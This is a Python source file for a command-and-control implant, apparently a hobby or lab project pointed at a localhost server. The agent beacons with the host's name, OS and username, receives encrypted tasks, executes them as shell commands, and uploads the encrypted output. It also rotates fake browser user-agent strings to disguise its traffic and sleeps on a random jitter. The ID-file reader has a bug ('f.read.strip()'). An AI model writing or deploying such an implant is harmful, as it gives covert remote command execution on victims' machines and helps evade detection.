import time
import uuid
import random
import requests
import subprocess
import platform
import getpass
import os
from common.cryptography_helpers import encrypt_string, decrypt_string

# Configuration
SERVER_URL = "http://127.0.0.1:5000"
BEACON_ENDPOINT = "/api/status"
RESULT_ENDPOINT = "/api/upload"
SLEEP_MIN = 10     # Minimum sleep in seconds
SLEEP_MAX = 30     # Maximum sleep in seconds


ID_FILE = ".agent_id"
def load_or_create_agent_id():
    # if there is an ID file, read and return it
    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            return f.read.strip()
        
    new_id = str(uuid.uuid4())
    with open(ID_FILE, "w") as f:
        f.write(new_id)
        
    return new_id

AGENT_ID = load_or_create_agent_id()

AGENT_META = {
    "hostname" : platform.node(),
    "os" : platform.system(),
    "user" : getpass.getuser()
}

print(f"[+] Agent started with ID: {AGENT_ID}")
    

# Fake user-agents to blend into normal traffic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
]

headers = {
    "User-Agent": random.choice(USER_AGENTS),
    "Authorization": f"Bearer {AGENT_ID}",
    "X-Session-ID": str(uuid.uuid4())
}

def beacon():
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    payload = {"id": AGENT_ID,
               "meta": AGENT_META}
    try:
        response = requests.post(SERVER_URL + BEACON_ENDPOINT, json=payload, headers=headers)
        if response.status_code == 200:
            data = response.json()
            task = data.get("task")
            if task:
                try:
                    execute_task(decrypt_string(task))
                except Exception as e:
                    print(f"[!] Task decrypt/execute failed: {e}")
    except Exception as e:
        print(f"[!] Beacon error: {e}")

def execute_task(task):
    try:
        print(f"[+] Executing task: {task}")
        result = subprocess.check_output(task, shell=True, stderr=subprocess.STDOUT)
        post_result(result.decode())
    except subprocess.CalledProcessError as e:
        post_result(e.output.decode())

def post_result(result):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    payload = {"id": AGENT_ID, "output": encrypt_string(result)}
    try:
        requests.post(SERVER_URL + RESULT_ENDPOINT, json=payload, headers=headers)
    except Exception as e:
        print(f"[!] Result posting error: {e}")

def main():
    while True:
        beacon()
        sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()